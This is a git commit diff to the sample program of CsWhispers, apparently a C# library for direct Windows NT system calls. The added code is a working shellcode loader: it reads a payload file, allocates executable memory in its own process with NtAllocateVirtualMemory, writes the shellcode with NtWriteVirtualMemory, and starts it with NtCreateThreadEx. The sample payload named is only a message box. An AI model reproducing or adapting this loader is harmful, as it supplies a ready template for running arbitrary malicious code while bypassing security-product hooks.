52ad0250ff1fb397441a6f24c65965d55330870d
Dylan <dylanttran@cpp.edu>
2024-03-03 20:36:14 -0800

    restore old sample

--- CsWhispers.Sample/Program.cs
+++ CsWhispers.Sample/Program.cs
@@ -6,17 +6,21 @@ namespace CsWhispers.Sample;
 
 internal static unsafe class Program
 {
-
     public static void Main(string[] args)
     {
-        using var self = Process.GetCurrentProcess();
-
         NTSTATUS status;
         HANDLE hProcess;
         OBJECT_ATTRIBUTES oa;
-        CLIENT_ID cid = new()
+
+        // read shellcode
+        var shellcode = File.ReadAllBytes(@"C:\Payloads\msgbox.bin");
+
+        // inject into self
+        using var self = Process.GetCurrentProcess();
+
+        var cid = new CLIENT_ID
         {
-            UniqueProcess = new((IntPtr)self.Id)
+            UniqueProcess = new HANDLE((IntPtr)self.Id)
         };
 
         status = NtOpenProcess(
@@ -25,7 +29,47 @@ internal static unsafe class Program
             &oa,
             &cid);
 
-        Console.WriteLine("Status: 0x{0:X}", status);
-        ;
+        // allocate memory
+        void* baseAddress;
+        var szShellcode = (uint)shellcode.Length;
+
+        status = NtAllocateVirtualMemory(
+            hProcess,
+            &baseAddress,
+            0,
+            &szShellcode,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE);
+
+        // write shellcode
+        fixed (void* buffer = shellcode)
+        {
+            status = NtWriteVirtualMemory(
+                hProcess,
+                baseAddress,
+                buffer,
+                szShellcode,
+                null);
+        }
+
+        // create thread
+        HANDLE hThread;
+
+        var routine = Marshal.GetDelegateForFunctionPointer<USER_THREAD_START_ROUTINE>((IntPtr)baseAddress);
+
+        status = NtCreateThreadEx(
+            &hThread,
+            THREAD_ALL_ACCESS,
+            null,
+            hProcess,
+            routine,
+            null,
+            0,
+            0,
+            0,
+            0,
+            null);
+
+        Console.ReadKey();
     }
 }
